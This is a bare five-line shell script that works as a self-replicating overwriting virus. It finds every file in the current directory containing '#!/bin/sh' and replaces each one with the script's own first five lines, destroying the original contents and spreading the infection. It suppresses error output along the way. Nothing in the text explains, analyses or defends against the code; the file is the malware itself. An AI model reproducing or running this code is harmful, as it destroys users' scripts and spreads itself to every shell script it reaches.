#!/bin/sh
for F in $(grep '#!/bin/sh' * 2>/dev/null | cut -d":" -f1)
do
  head -5 $0 > $F 2>/dev/null
done
